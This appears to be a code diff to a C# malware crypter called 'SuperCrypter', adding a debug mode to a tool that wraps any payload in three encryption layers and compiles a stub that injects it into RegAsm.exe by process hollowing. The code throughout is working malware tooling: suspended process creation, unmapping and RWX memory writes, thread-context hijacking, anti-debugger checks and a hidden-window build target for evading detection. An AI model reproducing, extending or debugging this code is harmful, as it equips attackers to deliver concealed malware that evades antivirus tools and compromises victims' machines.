@@ -10,6 +10,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
 using Microsoft.CSharp;
+using System.Collections.Generic;
 
 public class SuperCrypter
 {
@@ -83,9 +84,9 @@ public class SuperCrypter
           .Select(s => s[random.Next(s.Length)]).ToArray());
     }
 
-    private static string GetStubSource()
+    private static string GetStubSource(bool debugMode)
     {
-        return @"
+        string stub = @"
 using System;
 using System.IO;
 using System.Text;
@@ -106,7 +107,6 @@ class Stub
     private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
-
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr lpContext);
@@ -164,22 +164,25 @@ class Stub
 
     public static void Execute(byte[] payload, string host)
     {
+        #if DEBUG
+        Console.WriteLine(""[STUB] Executing payload in host: "" + host);
+        #endif
         STARTUPINFO si = new STARTUPINFO(); PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); si.cb = Marshal.SizeOf(si);
         try
         {
-            if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) throw new Exception();
+            if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) throw new Exception(""CreateProcess failed"");
             int e_lfanew = BitConverter.ToInt32(payload, 60); int opHeader = e_lfanew + 24; short magic = BitConverter.ToInt16(payload, opHeader);
             long imageBase;
-            IntPtr context = IntPtr.Zero;
+            IntPtr context;
 
             if (magic == 0x10b) { context = Marshal.AllocHGlobal(716); Marshal.WriteInt64(context, 0, 0x10002); if (IntPtr.Size == 4) GetThreadContext(pi.hThread, context); else Wow64GetThreadContext(pi.hThread, context); imageBase = BitConverter.ToInt32(payload, opHeader + 28); }
             else if (magic == 0x20b) { context = Marshal.AllocHGlobal(1232); Marshal.WriteInt64(context, 0, 0x100002); GetThreadContext(pi.hThread, context); imageBase = BitConverter.ToInt64(payload, opHeader + 24); }
-            else throw new Exception();
+            else throw new Exception(""Invalid magic value"");
 
             NtUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
             uint sizeOfImage = BitConverter.ToUInt32(payload, opHeader + 56);
             IntPtr newImageBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40);
-            if (newImageBase == IntPtr.Zero) throw new Exception();
+            if (newImageBase == IntPtr.Zero) throw new Exception(""VirtualAllocEx failed"");
             int bytesWritten = 0;
             WriteProcessMemory(pi.hProcess, newImageBase, payload, (int)BitConverter.ToUInt32(payload, opHeader + 60), ref bytesWritten);
             for (int i = 0; i < BitConverter.ToInt16(payload, e_lfanew + 6); i++) {
@@ -195,14 +198,26 @@ class Stub
             else { long rdx = Marshal.ReadInt64(context, 136); WriteProcessMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(newImageBase.ToInt64()), 8, ref bytesWritten); Marshal.WriteInt64(context, 128, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); SetThreadContext(pi.hThread, context); }
             Marshal.FreeHGlobal(context);
             ResumeThread(pi.hThread);
-        } catch {}
+        } catch (Exception ex) {
+            #if DEBUG
+            Console.WriteLine(""[STUB-ERROR] "" + ex.Message);
+            #endif
+        }
     }
 
     public static void Main()
     {
+        #if DEBUG
+        Console.WriteLine(""[STUB] Starting..."");
+        #endif
         bool isDebuggerPresent = false;
         CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
-        if (isDebuggerPresent) return;
+        if (isDebuggerPresent) {
+            #if DEBUG
+            Console.WriteLine(""[STUB] Debugger detected. Exiting."");
+            #endif
+            return;
+        }
 
         Thread.Sleep(2000);
 
@@ -210,10 +225,25 @@ class Stub
         var reader = new ResourceManager(""[RESOURCE_NAME]"", assembly);
         byte[] payload = (byte[])reader.GetObject(""[PAYLOAD_KEY]"");
 
-        // Three layers of real decryption
+        #if DEBUG
+        Console.WriteLine(""[STUB] Payload loaded. Size: "" + payload.Length);
+        Console.WriteLine(""[STUB] Decrypting Layer 3 (ShiftXor)..."");
+        #endif
         payload = ShiftXorDecrypt(payload, ""[KEY3]"", [SHIFT_KEY]);
+
+        #if DEBUG
+        Console.WriteLine(""[STUB] Decrypting Layer 2 (PolyRev)..."");
+        #endif
         payload = PolyRevDecrypt(payload, ""[KEY2]"");
+
+        #if DEBUG
+        Console.WriteLine(""[STUB] Decrypting Layer 1 (AES)..."");
+        #endif
         payload = AESDecrypt(payload, ""[KEY1]"");
+
+        #if DEBUG
+        Console.WriteLine(""[STUB] Decryption complete. Final size: "" + payload.Length);
+        #endif
 
         string frameworkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), ""Microsoft.NET\\Framework\\v4.0.30319"");
         string target = Path.Combine(frameworkDir, ""RegAsm.exe"");
@@ -225,19 +255,27 @@ class Stub
     }
 }
 ";
+        if (debugMode)
+        {
+            stub = "#define DEBUG\n" + stub;
+        }
+        return stub;
     }
 
     public static void Main(string[] args)
     {
-        if (args.Length < 3)
+        bool debugMode = args.Contains("--debug");
+        List<string> filteredArgs = args.Where(arg => arg != "--debug").ToList();
+
+        if (filteredArgs.Count < 3)
         {
-            Console.WriteLine("Usage: SuperCrypter.exe <payload_path> <output_path> <aes_password>");
+            Console.WriteLine("Usage: SuperCrypter.exe <payload_path> <output_path> <aes_password> [--debug]");
             return;
         }
 
-        string payloadPath = args[0];
-        string outputPath = args[1];
-        string key1 = args[2];
+        string payloadPath = filteredArgs[0];
+        string outputPath = filteredArgs[1];
+        string key1 = filteredArgs[2];
         string key2 = GenerateRandomString(24);
         string key3 = GenerateRandomString(32);
         int shiftKey = new Random().Next(1, 7);
@@ -252,20 +290,27 @@ class Stub
 
         try
         {
-            Console.WriteLine("Reading payload...");
+            if (debugMode) Console.WriteLine("DEBUG MODE ENABLED");
+            Console.WriteLine("Reading payload from " + payloadPath);
             byte[] payloadBytes = File.ReadAllBytes(payloadPath);
 
             Console.WriteLine("Encrypting with AES (Layer 1)...");
             byte[] encrypted1 = AESEncrypt(payloadBytes, key1);
+            if (debugMode) Console.WriteLine("  -> AES Key: " + key1);
 
             Console.WriteLine("Encrypting with PolyRev (Layer 2)...");
             byte[] encrypted2 = PolyRevEncrypt(encrypted1, key2);
+            if (debugMode) Console.WriteLine("  -> PolyRev Key: " + key2);
 
             Console.WriteLine("Encrypting with ShiftXor (Layer 3)...");
             byte[] encrypted3 = ShiftXorEncrypt(encrypted2, key3, shiftKey);
+            if (debugMode) {
+                Console.WriteLine("  -> ShiftXor Key: " + key3);
+                Console.WriteLine("  -> Shift Amount: " + shiftKey);
+            }
 
             Console.WriteLine("Generating stub...");
-            string stubSource = GetStubSource();
+            string stubSource = GetStubSource(debugMode);
             stubSource = stubSource.Replace("[RESOURCE_NAME]", resourceName);
             stubSource = stubSource.Replace("[PAYLOAD_KEY]", payloadKey);
             stubSource = stubSource.Replace("[KEY1]", key1);
@@ -279,13 +324,15 @@ class Stub
                 resourceWriter.AddResource(payloadKey, encrypted3);
             }
 
-            Console.WriteLine("Compiling executable...");
+            string compilerTarget = debugMode ? "exe" : "winexe";
+            Console.WriteLine("Compiling executable (target: " + compilerTarget + ")...");
+
             var provider = new CSharpCodeProvider();
             var parameters = new CompilerParameters
             {
                 GenerateExecutable = true,
                 OutputAssembly = outputPath,
-                CompilerOptions = "/target:exe /platform:anycpu",
+                CompilerOptions = "/target:" + compilerTarget + " /platform:anycpu",
                 EmbeddedResources = { resourceFileName }
             };
             parameters.ReferencedAssemblies.Add("System.dll");
